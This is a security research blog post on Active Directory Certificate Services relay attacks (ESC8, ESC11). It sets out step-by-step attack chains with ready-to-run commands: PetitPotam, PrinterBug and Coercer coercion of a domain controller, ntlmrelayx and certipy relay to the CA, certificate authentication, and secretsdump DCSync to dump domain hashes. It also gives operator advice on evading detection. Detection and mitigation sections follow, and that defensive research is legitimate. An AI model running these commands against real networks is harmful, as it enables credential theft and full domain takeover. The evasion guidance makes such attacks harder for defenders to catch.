---
title: "AD CS Abuse Research, Part 4: Relay-Based Attacks (ESC8, ESC11)"
date: 2026-06-09
categories: [Personal]
tags: [Windows, Active Directory, ADCS, Certificates, Privilege Escalation, Research]
published: true
---

This post covers the relay attack class in AD CS, where an attacker coerces authentication from a target machine, relays those credentials to a CA enrollment interface, and obtains a certificate for the coerced account. It walks through the HTTP enrollment and MS-ICPR protocol surfaces, the coercion primitives used to trigger outbound authentication, and the full attack chains for ESC8 and ESC11, including OPSEC profiles and detection indicators for each.

---

## Table of Contents

1. [The Relay Attack Class](#1-the-relay-attack-class)
2. [CA Enrollment Protocol Surfaces](#2-ca-enrollment-protocol-surfaces)
3. [Coercion Primitives](#3-coercion-primitives)
4. [ESC8: NTLM Relay to HTTP Enrollment](#4-esc8-ntlm-relay-to-http-enrollment)
5. [ESC11: NTLM Relay to MS-ICPR](#5-esc11-ntlm-relay-to-ms-icpr)
6. [From Certificate to Domain Compromise](#6-from-certificate-to-domain-compromise)
7. [OPSEC Profile: Relay Class](#7-opsec-profile-relay-class)
8. [Detection and Defensive Indicators](#8-detection-and-defensive-indicators)

---

## 1. The Relay Attack Class

The relay attack class differs from the ESC classes covered in previous parts in one fundamental way: the attacker does not enroll a certificate using credentials they directly possess. Instead they coerce a target machine or user into authenticating outbound, intercept that authentication attempt, and relay it to a CA enrollment interface on behalf of the victim. The CA sees the victim's identity at the transport layer and issues a certificate for that identity.

The output of a successful relay attack is the same as any other enrollment: a signed certificate for the coerced account, usable for PKINIT to obtain a TGT. From that point the chain is identical to ESC1 or ESC14: cert to TGT to whatever that account's group memberships and ACL rights allow. The relay is just a different path to the same artifact.

What makes this class particularly valuable is the target: the most useful accounts to coerce are machine accounts, specifically domain controllers. A DC machine account (e.g. `DC01$`) has `DS-Replication-Get-Changes-All` rights by default, meaning a certificate for the DC machine account leads directly to DCSync and full domain compromise via a single relay operation.

### How NTLM Relay Works in This Context

NTLM is a challenge-response authentication protocol. When a client authenticates to a server using NTLM:

1. The client sends a `NEGOTIATE` message declaring its capabilities
2. The server responds with a `CHALLENGE` message containing a server-generated nonce
3. The client responds with an `AUTHENTICATE` message containing the NT hash response computed over the nonce

The vulnerability in relay attacks is that the attacker sits between the client and the intended server. The attacker forwards the client's `NEGOTIATE` to the target server (the CA enrollment endpoint), receives the server's `CHALLENGE`, forwards it back to the client, receives the client's `AUTHENTICATE` response, and forwards that to the CA. The CA validates the response against AD and grants the attacker the authenticated session, all without the attacker ever learning the victim's credentials.

NTLM relay is possible because NTLM authentication is not inherently bound to the channel it travels over. The `AUTHENTICATE` message is valid on any connection to any service that accepts NTLM, not just the connection it was originally intended for. The defensive mitigation is NTLM signing or channel binding, both of which tie the authentication to a specific connection and prevent it from being forwarded to a different one.

### Why CA Enrollment Endpoints Are Relay Targets

CA enrollment endpoints are attractive relay targets for two reasons. First, they accept NTLM authentication; both the HTTP `/certsrv` interface and the MS-ICPR RPC interface support NTLM without requiring signing or channel binding in their default configurations. Second, the certificate the CA issues reflects whoever authenticated at the transport layer, not who submitted the CSR content. Relay the DC machine account's NTLM auth to the CA and the CA issues a certificate for `DC01$`.

---

## 2. CA Enrollment Protocol Surfaces

Understanding which protocol surface ESC8 and ESC11 target, and why each is vulnerable by default, requires knowing how each interface handles authentication.

### HTTP Enrollment (`/certsrv`)

The CA Web Enrollment role (`certsrv`) exposes a set of ASP pages over HTTP on the CA server. The relevant endpoint for certificate requests is `/certsrv/certfnsh.asp`, which accepts a PKCS#10 CSR as a POST parameter and returns the signed certificate.

Authentication to `/certsrv` uses HTTP NTLM or Kerberos negotiation via the standard `WWW-Authenticate` header exchange. The critical default condition is that the endpoint does not require HTTPS. IIS is configured by default to accept HTTP connections to `/certsrv`, meaning the NTLM exchange travels in cleartext and there is no TLS channel binding to prevent relay.

Even when HTTPS is configured, EPA (Extended Protection for Authentication) is not enabled by default on IIS. EPA implements channel binding tokens that tie the NTLM authentication to the specific TLS session. Without EPA, NTLM auth over HTTPS is still relayable to HTTP endpoints because the channel binding is not enforced end-to-end.

The HTTP enrollment interface also does not enforce NTLM signing. SMB requires signing in certain configurations; HTTP does not. This makes `/certsrv` a reliable relay target in the default configuration.

### MS-ICPR (ICertPassage Remote Protocol)

MS-ICPR is an older, simpler RPC interface exposed by the CA service alongside MS-WCCE. It implements the `ICertPassage` interface and exposes a single method, `CertServerRequest`, which accepts a CSR and returns a certificate or status code. The endpoint is reachable via:

- Named pipe: `\pipe\ICertPassage` over SMB (port 445)
- TCP: port 135 (endpoint mapper) with dynamic high port assignment

The named pipe binding is the relay target for ESC11. Like HTTP enrollment, it does not enforce NTLM signing or channel binding in its default configuration. When NTLM authentication is used to open the `\pipe\ICertPassage` named pipe, the auth exchange travels over SMB but the signing requirement depends on the SMB session configuration, not the MS-ICPR interface itself.

The distinction between MS-WCCE and MS-ICPR matters here. MS-WCCE is the primary modern enrollment interface and has received more security attention over time. MS-ICPR predates it, is less frequently audited in security reviews, and has significantly less tooling built around it as a relay target. This is what makes ESC11 the more interesting research target: the attack surface is real and broad, but the exploitation tooling is sparse compared to the HTTP relay path.

### Why MS-WCCE Is Not in This Class

MS-WCCE (the `\pipe\cert` named pipe) is the interface Certipy and most other enrollment tools use for direct certificate requests. It is also theoretically relayable, but in practice it requires NTLM session security with at minimum integrity (signing), which prevents straightforward relay in modern environments. MS-ICPR does not have this requirement in its default configuration, which is why ESC11 targets MS-ICPR rather than MS-WCCE.

---

## 3. Coercion Primitives

Relay attacks require the target to initiate an outbound NTLM authentication to an attacker-controlled host. In most environments, servers do not spontaneously authenticate outbound; they need to be triggered. Coercion primitives are techniques that abuse Windows features or protocols to force a specific machine to authenticate to an arbitrary destination.

### PetitPotam (MS-EFSRPC)

PetitPotam coerces NTLM authentication by calling the `EfsRpcOpenFileRaw` method on the MS-EFSRPC (Encrypting File System Remote Protocol) interface. This method is designed to open an encrypted file remotely, but it can be called unauthenticated on older systems and accepts a UNC path as a parameter. When a UNC path pointing to the attacker's host is supplied, the target machine initiates an NTLM authentication to that path.

PetitPotam was patched to require authentication for `EfsRpcOpenFileRaw` in August 2021, but several other MS-EFSRPC methods remain coercible and the interface continues to be a reliable coercion source on patched systems where the EFS service is running.

```bash
python3 PetitPotam.py -u attacker -p Password1 <attacker-ip> <target-dc-ip>
```

### PrinterBug (MS-RPRN SpoolSS)

The Print Spooler service exposes `RpcRemoteFindFirstPrinterChangeNotificationEx` via MS-RPRN, which can be called by any authenticated domain user to force the spooler service (running as SYSTEM, i.e. the machine account) to authenticate to an arbitrary UNC path.

```bash
python3 printerbug.py domain/attacker:Password1@<target-dc-ip> <attacker-ip>
```

PrinterBug requires the Print Spooler service to be running on the target. Microsoft has increasingly recommended disabling the spooler on DCs, but it remains enabled in many environments.

### Coercer

Coercer is a tool that consolidates multiple coercion techniques across different RPC interfaces (MS-RPRN, MS-EFSRPC, MS-DFSNM, MS-FSRVP, and others) into a single scanner and trigger. It enumerates which coercion methods are available on a target before attempting them.

```bash
coercer coerce -u attacker -p Password1 -d domain.com \
  -l <attacker-ip> -t <target-dc-ip>
```

### Choosing a Coercion Method

For relay to CA enrollment endpoints, the coercion target is typically the DC machine account. The choice of coercion primitive depends on what is available on the target:

- Print Spooler running: PrinterBug is reliable and well understood
- EFS service running: PetitPotam (authenticated variant post-patch)
- Enumerate first: Coercer's scan mode identifies what is available without triggering

The attacker-controlled listener that receives the coerced authentication is `ntlmrelayx` (for ESC8) or a modified relay tool (for ESC11). The listener must be set up before the coercion is triggered.

---

## 4. ESC8: NTLM Relay to HTTP Enrollment

### Vulnerability Class

ESC8 is NTLM relay to the CA's HTTP enrollment interface (`/certsrv`). The CA Web Enrollment role must be installed and accessible, and the endpoint must accept NTLM authentication without requiring HTTPS with EPA. Both conditions hold in the default installation.

### Prerequisites

1. The CA has the Web Enrollment role installed and `/certsrv` is accessible from the attacker's position on the network
2. The endpoint accepts NTLM (default) and does not enforce HTTPS with EPA
3. A coercible target exists whose certificate would be useful (typically a DC machine account for the DCSync path)
4. The attacker is positioned to intercept and relay NTLM authentication (i.e. `ntlmrelayx` can receive the coerced auth and forward to the CA)

### Checking Whether the Web Enrollment Role Is Installed

```bash
# Check if /certsrv is accessible
curl -I http://<ca-ip>/certsrv/

# Certipy find will report the HTTP endpoint if present
certipy find -u attacker@domain.com -p Password1 -dc-ip 10.10.10.10
# Look for: Web Enrollment: Enabled
```

### Attack Chain

**Step 1: Start ntlmrelayx targeting the CA HTTP endpoint**

```bash
impacket-ntlmrelayx -t http://<ca-ip>/certsrv/certfnsh.asp \
  --adcs --template 'DomainController' \
  -smb2support
```

The `--adcs` flag tells ntlmrelayx to use the relayed session to request a certificate rather than perform other post-relay actions. The `--template` flag specifies which template to request against. `DomainController` is the default template for DC machine account certificates and is typically published on enterprise CAs. `Machine` or `Computer` are alternatives depending on the environment.

**Step 2: Coerce the domain controller**

With the relay listener running, trigger outbound NTLM authentication from the target DC.

```bash
# PrinterBug
python3 printerbug.py domain/attacker:Password1@<dc-ip> <attacker-ip>

# PetitPotam (authenticated)
python3 PetitPotam.py -u attacker -p Password1 <attacker-ip> <dc-ip>
```

**Step 3: Receive the certificate**

ntlmrelayx intercepts the DC's NTLM authentication, relays it to `/certsrv/certfnsh.asp`, submits a CSR for the DC machine account using the relayed session, and saves the returned certificate as a base64-encoded PFX.

```
[*] Authenticating against http://<ca-ip> as DOMAIN\DC01$
[*] SMBD-Thread-5: Received connection from <dc-ip>
[*] Got certificate for DC01$ via relay
[*] Saved certificate and private key to 'DC01$.pfx'
```

**Step 4: Authenticate as the DC machine account**

```bash
certipy auth -pfx DC01$.pfx -dc-ip 10.10.10.10
# Returns TGT and NT hash for DC01$
```

**Step 5: DCSync**

Use the DC machine account's TGT or NT hash to perform DCSync and dump domain credentials.

```bash
impacket-secretsdump -k -no-pass DC01.domain.com \
  -just-dc-ntlm -dc-ip 10.10.10.10

# Or with the NT hash via pass-the-hash
impacket-secretsdump -hashes :<NT-hash> 'domain/DC01$@10.10.10.10' \
  -just-dc-ntlm
```

### Template Considerations

The template used in the relay request must allow machine account enrollment and have an auth EKU. `DomainController` is the standard template for this; it is enrolled by DC machine accounts and includes Smart Card Logon and Client Authentication EKUs. If `DomainController` is not published on the CA, `Machine` or `Computer` templates are alternatives, though they may have different enrollment permission constraints.

The template name is passed in the CSR attributes during the HTTP POST. ntlmrelayx's `--adcs` implementation handles this automatically, but understanding the template dependency matters for troubleshooting failed relay attempts where the CA returns a denial rather than a certificate.

### Relay to Non-DC Targets

While DC machine accounts are the highest-impact target, any machine account that has useful rights or group memberships is a valid relay target. Service accounts running as SYSTEM on servers, machine accounts with `GenericWrite` on other objects (detectable via BloodHound), or accounts with constrained delegation configured are all worth considering as relay targets when DC coercion is not available.

---

## 5. ESC11: NTLM Relay to MS-ICPR

### Vulnerability Class

ESC11 is NTLM relay to the CA's MS-ICPR RPC interface over the `\pipe\ICertPassage` named pipe. The attack achieves the same outcome as ESC8 (a certificate for the coerced account) but via a different protocol surface. The key distinction is that MS-ICPR does not require the Web Enrollment role to be installed. Any CA that exposes the MS-ICPR endpoint (which is all of them by default) is potentially vulnerable, making the attack surface broader than ESC8 even though it is less commonly exploited due to tooling gaps.

### Prerequisites

1. The CA is reachable over SMB (port 445) from the attacker's position
2. The CA does not enforce `IF_ENFORCEENCRYPTICERTREQUEST`, the MS-ICPR interface flag that requires signing on certificate requests
3. A coercible target exists whose certificate would be useful
4. Relay tooling capable of speaking MS-ICPR is available

Condition 2 is the key differentiator. `IF_ENFORCEENCRYPTICERTREQUEST` is a CA configuration flag that enforces NTLM signing on MS-ICPR connections. When set, relay attacks against MS-ICPR are blocked because the attacker cannot satisfy the signing requirement without the victim's session key. This flag is not set by default, meaning most CAs are vulnerable unless it has been explicitly hardened.

Checking whether the flag is set:

```bash
# Read the CA's InterfaceFlags registry value
# HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CAName>\InterfaceFlags
# Flag value 0x200 = IF_ENFORCEENCRYPTICERTREQUEST
# If the flag is absent or 0, the CA is vulnerable

certutil -getreg CA\InterfaceFlags
# Look for: IF_ENFORCEENCRYPTICERTREQUEST
# If not present in the output, the CA is vulnerable to ESC11
```

### Why ESC11 Matters Beyond ESC8

In environments where the Web Enrollment role is not installed (common in security-conscious deployments that have stripped unnecessary CA roles), ESC8 is not available. ESC11 fills that gap. The MS-ICPR interface is exposed by every CA regardless of which optional roles are installed. A CA hardened against ESC8 by removing Web Enrollment remains vulnerable to ESC11 unless `IF_ENFORCEENCRYPTICERTREQUEST` is explicitly set.

This is the core research value of ESC11: it is a relay path that exists on every CA by default, requires no optional role installation, and currently has almost no standalone tooling compared to the mature `ntlmrelayx --adcs` implementation for ESC8.

### The Tooling Gap

At time of writing, ESC11 relay requires either:

- A modified version of `ntlmrelayx` with MS-ICPR support (not in the mainline Impacket release)
- `certipy relay` with the `-ca` flag pointing to the CA's hostname (Certipy 4.x added limited MS-ICPR relay support)
- Custom tooling built against the MS-ICPR IDL

The Certipy implementation covers the basic case:

```bash
certipy relay -ca <ca-hostname> -template 'DomainController'
```

But it does not cover all MS-ICPR scenarios and has known limitations around certain CA configurations. This is precisely the gap the unified tooling project targets.

### Attack Chain

**Step 1: Confirm MS-ICPR is accessible and IF_ENFORCEENCRYPTICERTREQUEST is not set**

```bash
# Check SMB connectivity to the CA
nxc smb <ca-ip> -u attacker -p Password1

# Read CA interface flags (requires registry access or certutil on the CA)
certutil -config '<ca-hostname>\<ca-name>' -getreg CA\InterfaceFlags
```

**Step 2: Start the relay listener targeting MS-ICPR**

Using Certipy's relay functionality:

```bash
certipy relay -ca <ca-hostname> -template 'DomainController'
```

Certipy will listen for incoming NTLM authentication on port 445 (requires running as root or redirecting the port), relay it to the CA's MS-ICPR interface, and request a certificate using the relayed session.

For custom tooling or the modified ntlmrelayx path:

```bash
impacket-ntlmrelayx -t rpc://<ca-ip> --adcs \
  --rpc-mode ICPR --icpr-ca '<ca-name>' \
  --template 'DomainController' -smb2support
```

Note: `--rpc-mode ICPR` is not in mainline Impacket as of writing. This flag exists in community forks and is the primary functionality gap the ESC11 tool module targets.

**Step 3: Coerce the domain controller**

Same coercion primitives as ESC8: PrinterBug, PetitPotam, or Coercer targeting the DC.

```bash
coercer coerce -u attacker -p Password1 -d domain.com \
  -l <attacker-ip> -t <dc-ip>
```

**Step 4: Receive the certificate and authenticate**

The relay tool receives the DC's NTLM auth, relays it to MS-ICPR, and saves the returned certificate.

```bash
certipy auth -pfx DC01$.pfx -dc-ip 10.10.10.10
```

**Step 5: DCSync**

Identical to the ESC8 path from this point.

```bash
impacket-secretsdump -k -no-pass DC01.domain.com \
  -just-dc-ntlm -dc-ip 10.10.10.10
```

### MS-ICPR Protocol Detail

Understanding the MS-ICPR `CertServerRequest` method call is useful for tooling development. The method signature is:

```
DWORD CertServerRequest(
  [in] DWORD dwFlags,
  [in, string, unique] const wchar_t* pwszAuthority,
  [in, out, unique] DWORD* pdwRequestId,
  [out] DWORD* pdwDisposition,
  [in] const CERTTRANSBLOB* pctbAttribs,
  [in] const CERTTRANSBLOB* pctbRequest,
  [out] CERTTRANSBLOB* pctbCertChain,
  [out] CERTTRANSBLOB* pctbEncodedCert,
  [out] CERTTRANSBLOB* pctbDispositionMessage
);
```

The key parameters for exploitation:

- `pwszAuthority`: the CA name string (e.g. `corp-CA`)
- `pctbAttribs`: request attributes including the template name, formatted as `CertificateTemplate:<TemplateName>`
- `pctbRequest`: the DER-encoded PKCS#10 CSR
- `pctbEncodedCert`: on success, contains the DER-encoded issued certificate

The `dwFlags` value `CR_IN_PKCS10` (`0x00000100`) indicates the request format is PKCS#10. The CA name in `pwszAuthority` must match exactly; this is a common failure point when building tooling against unfamiliar CA configurations.

The relay occurs at the SMB/named pipe layer: the attacker opens `\pipe\ICertPassage` using the relayed NTLM session, then makes the `CertServerRequest` RPC call over that authenticated pipe. The CA's security context for the request is the relayed identity, not the attacker's.

---

## 6. From Certificate to Domain Compromise

The relay attack class consistently produces a machine account certificate. The downstream chain from that certificate to full domain compromise is the same regardless of whether ESC8 or ESC11 was used to obtain it, and it is worth documenting explicitly since it involves a few steps that are easy to overlook.

### Machine Account Certificate to TGT

```bash
certipy auth -pfx DC01$.pfx -domain domain.com -dc-ip 10.10.10.10
# Output: TGT saved to DC01$.ccache, NT hash: <hash>
```

The `certipy auth` command performs PKINIT using the certificate and returns two artifacts: the TGT (saved as a `.ccache` file) and the NT hash of the machine account (recovered via UnPAC-the-Hash). Both are usable for subsequent steps.

### TGT to DCSync

Export the TGT for use with Impacket:

```bash
export KRB5CCNAME=DC01$.ccache
impacket-secretsdump -k -no-pass DC01.domain.com \
  -just-dc-ntlm -dc-ip 10.10.10.10
```

### NT Hash to DCSync

If Kerberos is not viable (e.g. clock skew issues, no DNS resolution), use the NT hash directly:

```bash
impacket-secretsdump -hashes :<NT-hash> \
  'domain/DC01$@10.10.10.10' -just-dc-ntlm
```

### Why Machine Accounts Have DCSync Rights

Domain controller machine accounts are members of the built-in `Domain Controllers` group and by default hold the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` extended rights on the domain NC head. These are the rights required for DCSync. This is not a misconfiguration; it is how replication works. Coercing a DC machine account's authentication to obtain a certificate for it is therefore a direct path to DCSync regardless of any other configuration in the environment.

Non-DC machine accounts do not have these rights by default. For those, the post-cert chain depends on the specific account's rights, group memberships, and what BloodHound paths are available from it.

---

## 7. OPSEC Profile: Relay Class

The relay attack class generates a fundamentally different log pattern from the ESC classes covered in previous parts. There are no template modifications, no CA configuration changes, and no anomalous account attribute writes. The certificate issuance event appears entirely normal because the CA genuinely authenticated the DC machine account via NTLM. The suspicious indicators are at the network and authentication layers rather than the PKI layer.

### Network-Level Indicators

**Outbound SMB from the DC to an unexpected host**: the coercion step forces the DC to initiate an SMB connection to the attacker's listener. SMB connections from a DC to a workstation or non-server host are unusual and should be alerted on. Network detection of outbound port 445 from DCs to non-DC, non-server hosts is a high-fidelity indicator for coercion attempts.

**NTLM authentication from DC machine account to an unexpected host**: NTLM auth from a DC machine account (`DC01$`) to any host other than domain members it normally communicates with is suspicious. This is visible in network captures and in some SIEM configurations that monitor NTLM authentication events.

### CA-Side Events

**Event ID 4886 (Certificate Issued)**: Generated for the relay-obtained certificate. In the ESC8 and ESC11 context, the requester identity will be the DC machine account (`DC01$`), and the issued certificate's subject will reflect the DC. This is not inherently suspicious since DCs legitimately enroll `DomainController` template certs, but the issuance timestamp relative to other indicators (outbound SMB from the DC, Event ID 4624 on the relay host) provides correlation.

**Event ID 4768 (Kerberos TGT Request)**: The PKINIT TGT request following the relay. Pre-Authentication Type `17`. For a DC machine account using PKINIT this is unusual, since DCs normally obtain TGTs via standard password-based Kerberos rather than certificate authentication. Any PKINIT TGT request for a machine account that does not have certificate-based authentication configured in the environment warrants investigation.

### Windows Security Event Log (on the relay host)

If the attacker's relay listener is on a Windows host (less common but possible), Event ID 4624 (logon) and 4625 (failed logon) on that host will show the DC machine account attempting to authenticate. More commonly the relay host is Linux, where these events are not generated.

### Key OPSEC Considerations for Operators

**Relay listener placement**: the relay listener must be reachable by the target DC over the coercion path. On segmented networks, this may require positioning on a host that can receive traffic from the DC subnet. A compromised host in the same subnet as the DC is the cleanest position.

**Coercion method selection**: PrinterBug generates Event ID 4648 (explicit credential logon) on the DC when the spooler initiates the outbound connection. PetitPotam post-patch generates similar events. All coercion methods generate outbound network traffic from the DC. Prefer coercion methods that are already baseline noise in the environment; if the Print Spooler is actively used, PrinterBug-generated events blend in better than EFS-based coercion on a DC that never uses EFS.

**Template selection**: requesting a `DomainController` template certificate for the DC machine account is the legitimate intended use of that template. The issuance event is harder to distinguish from normal autoenrollment. Requesting a `User` or `Machine` template certificate for a DC machine account is more anomalous.

**Certificate persistence**: the relay-obtained certificate exists in the CA database. If the DC machine account's certificate is not normally obtained via PKINIT in the environment, a certificate in the database issued via NTLM relay (rather than autoenrollment from the DC) will stand out in a forensic review of CA issuance records, particularly if the requester host (the relay listener) does not match the DC's own hostname.

### Noise Profile

| Activity | Event | Location | Default Enabled |
|---|---|---|---|
| Coercion trigger (outbound SMB) | Network flow | Firewall/NDR | Depends on monitoring |
| NTLM auth from DC to relay host | NTLM auth log / network | Varies | No |
| Certificate issued for DC$ | 4886 | CA Security Log | Only if CA audit enabled |
| PKINIT TGT for machine account | 4768 (PreAuth=17) | DC Security Log | Yes |
| DCSync replication | 4662 | DC Security Log | Only if Object Access audit enabled |

The most universally available signal is 4768 with PreAuth type 17 for a machine account. In most environments, machine accounts do not use PKINIT. A single event of this type for a DC machine account in an environment without certificate-based auth infrastructure should be treated as a critical indicator.

---

## 8. Detection and Defensive Indicators

### Mitigating ESC8

**Enable HTTPS with EPA on the Web Enrollment endpoint**: this is the primary mitigation. Configure IIS to require HTTPS for `/certsrv` and enable Extended Protection for Authentication in the IIS authentication settings for the Web Enrollment application. This binds the NTLM authentication to the TLS session and prevents relay.

```
IIS Manager: Sites > Default Web Site > CertSrv > Authentication >
Windows Authentication > Advanced Settings >
Extended Protection: Required
```

**Remove the Web Enrollment role if not required**: if certificate enrollment is handled entirely via autoenrollment or via RPC (which is the case in many modern deployments), the Web Enrollment role can be removed from the CA entirely, eliminating the `/certsrv` attack surface.

```powershell
Uninstall-AdcsWebEnrollment
```

### Mitigating ESC11

**Set `IF_ENFORCEENCRYPTICERTREQUEST` on the CA**: this flag enforces NTLM signing on MS-ICPR connections, blocking relay attacks against the RPC enrollment interface.

```bash
certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
net stop certsvc && net start certsvc
```

Note this requires a CA service restart to take effect. After setting, test that legitimate enrollment still works before deploying to production CAs.

### Mitigating Coercion

**Disable the Print Spooler on DCs**: Microsoft's recommendation for some time. The spooler has no legitimate function on DCs in most environments.

```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```

**Block outbound SMB from DCs at the perimeter**: DCs should not be initiating SMB connections to arbitrary hosts. Firewall rules blocking outbound port 445 from DC subnets to non-DC, non-server subnets prevent coercion auth from reaching the attacker's relay listener.

**Enable NTLM blocking or audit**: configure the DC to audit or block NTLM authentication for outbound connections. GPO path:

```
Computer Configuration > Policies > Windows Settings > Security Settings >
Local Policies > Security Options >
Network Security: Restrict NTLM: Outgoing NTLM traffic to remote servers
```

Setting this to `Deny All` blocks all outbound NTLM from the DC, which breaks coercion-based relay regardless of the coercion method used. In environments where NTLM is still required for some legacy services, `Audit All` at minimum provides visibility.

### Detection Rules

**Alert on PKINIT TGT requests for machine accounts (Event ID 4768, PreAuth=17)**: in environments without certificate-based authentication deployed for machine accounts, any instance of this event for a machine account is high-fidelity. Baseline first, since some environments do use machine cert auth legitimately.

**Alert on outbound SMB from DCs to non-standard destinations**: any port 445 connection initiated by a DC to a host outside of its normal peer set (other DCs, file servers, AD-integrated systems) warrants investigation.

**Alert on DCSync from non-DC accounts (Event ID 4662)**: if DCSync is performed using the relayed DC machine account credentials from a non-DC host, Event ID 4662 will fire on the DC for directory replication access. The originating host in the event will not be the DC itself, which is the anomaly.

**Monitor CA issuance records for machine account certificates**: periodically audit the CA database for certificates issued to machine accounts, correlating the requester host against the account name. A `DC01$` certificate issued from a request that originated at a non-DC IP is a strong relay indicator.

```bash
# Enumerate all certificates issued to machine accounts
certutil -view -restrict "RequesterName=domain\DC01$" \
  -out "RequestID,RequesterName,NotBefore,SerialNumber"
```

---

*Next: Part 5: OID and Issuance Policy Abuse (ESC13 & ESC15)*
